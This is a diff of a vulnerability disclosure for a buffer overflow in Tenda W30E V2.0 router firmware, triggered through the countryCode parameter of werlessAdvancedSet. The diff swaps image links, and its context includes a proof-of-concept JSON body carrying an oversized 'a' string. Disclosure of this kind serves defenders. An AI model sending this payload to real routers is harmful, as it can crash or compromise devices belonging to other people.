@@ -9,10 +9,10 @@
 Tenda W30EV2.0 V16.01.0.21 was found to contain a buffer_overflow vulnerability in the `werlessAdvancedSet` function via the `countryCode` parameter. This vulnerability allows attackers to cause DOS attack or remote code execution via a crafted request.
 
 Function `werlessAdvancedSet`:
-![[Pasted image 20260328201126.png]]
+![repo_31](https://github.com/jsjbcyber/repo/blob/main/imgs/rep31.png)
 
 Function `cgi_split_countrycode`:
-![[Pasted image 20260328201407.png]]
+![repo_32](https://github.com/jsjbcyber/repo/blob/main/imgs/rep32.png)
 
 **POC**
 
@@ -34,4 +34,4 @@ Connection: keep-alive
 {"setAdvancedSetList":{"countryCode":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}}
 ```
 
-![[Pasted image 20260328201601.png]]
+![repo_33](https://github.com/jsjbcyber/repo/blob/main/imgs/rep33.png)
